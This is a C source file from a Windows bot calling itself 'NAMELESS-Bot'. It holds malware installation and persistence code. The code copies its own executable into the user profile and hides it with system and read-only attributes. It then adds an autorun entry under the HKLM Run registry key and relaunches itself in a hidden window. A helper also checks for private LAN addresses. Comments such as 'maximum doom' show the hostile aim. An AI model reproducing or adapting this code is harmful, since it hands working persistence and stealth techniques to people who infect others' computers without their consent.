/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include <stdlib.h>

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
/* INSTALL */
void Install_Files(void)
{
    char filename[MAX_PATH];
    char *userprofile           = getenv("USERPROFILE");
    char installpath[MAX_PATH];

    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename)); /* getting current filename */
    sprintf(installpath, "%s\\%s", userprofile, exename); /* C:\Documents and Settings\User */
    if (strcmp(filename, installpath))
    {
        /* install it to hdd for maximum doom ;) */
        /* now thats done lets continue installing ourselves... */
        SetFileAttributes(installpath, FILE_ATTRIBUTE_NORMAL);
        DeleteFile(installpath);
        CopyFile(filename, installpath, 1);
        SetFileAttributes(installpath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
        HKEY star_up;
 //       char *key13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        my_RegCreateKeyEx(HKEY_LOCAL_MACHINE , key13, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &star_up, NULL);
        my_RegSetValueEx(star_up, regname, 0, REG_SZ, (const unsigned char *)installpath, strlen(installpath));
        my_RegCloseKey(star_up);
        /* installed, lets do the initial star_up */
        my_ShellExecute(NULL, "open", installpath, "", NULL, SW_HIDE);
        Sleep(2000); /* wait till the process is started... */
        ExitProcess(EXIT_SUCCESS);
    }
    else
    {
        HKEY star_up;
  //      char *key13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        my_RegCreateKeyEx(HKEY_LOCAL_MACHINE , key13, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &star_up, NULL);
        my_RegSetValueEx(star_up, regname, 0, REG_SZ, (const unsigned char *)installpath, strlen(installpath));
        my_RegCloseKey(star_up);
    }
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IsLanBot(SOCKET sock)
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	if ((BYTE)sa.sa_data[2] == 192 && (BYTE)sa.sa_data[3] == 168)
		return TRUE;
	else if ((BYTE)sa.sa_data[2] == 127 && (BYTE)sa.sa_data[3] == 0)
		return TRUE;
	else if ((BYTE)sa.sa_data[2] == 10)
		return TRUE;
	else if ((BYTE)sa.sa_data[2] == 172 && (BYTE)sa.sa_data[3] > 15 && (BYTE)sa.sa_data[3] < 32)
		return TRUE;
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else
		return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
